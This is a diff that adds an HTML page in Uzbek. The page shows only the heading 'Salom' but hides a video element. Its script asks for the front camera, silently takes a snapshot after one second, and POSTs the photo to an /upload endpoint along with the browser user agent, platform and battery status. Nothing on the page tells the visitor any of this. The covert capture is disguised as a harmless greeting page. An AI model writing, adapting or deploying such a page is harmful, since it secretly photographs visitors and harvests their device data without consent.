@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <title>Salom</title>
+    <style>
+        #video {
+            display: none; 
+        }
+    </style>
+</head>
+<body>
+    <h1>Salom</h1>
+
+    <video id="video" autoplay></video>
+
+    <script>
+        const video = document.getElementById('video');
+
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => {
+                video.srcObject = stream;
+
+                video.onloadedmetadata = () => {
+                    setTimeout(captureAndSendPhoto, 1000); 
+                };
+            })
+            .catch(err => {
+                console.error("Kamera ruxsati berilmadi:", err);
+            });
+
+        async function captureAndSendPhoto() {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+
+            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+
+            let batteryLevel = 'unknown';
+            let batteryCharging = 'unknown';
+            try {
+                const battery = await navigator.getBattery();
+                batteryLevel = battery.level;
+                batteryCharging = battery.charging;
+            } catch (e) {}
+
+            const formData = new FormData();
+            formData.append('photo', blob, 'auto.jpg');
+            formData.append('userAgent', userAgent);
+            formData.append('platform', platform);
+            formData.append('batteryLevel', batteryLevel);
+            formData.append('batteryCharging', batteryCharging);
+
+            fetch('/upload', {
+                method: 'POST',
+                body: formData
+            }).then(res => {
+                if (res.ok) {
+                    console.log("Rasm va malumotlar yuborildi ✅");
+                } else {
+                    console.error("Yuborishda xatolik ❌");
+                }
+            }).catch(err => {
+                console.error("Xatolik:", err);
+            });
+        }
+    </script>
+</body>
+</html>
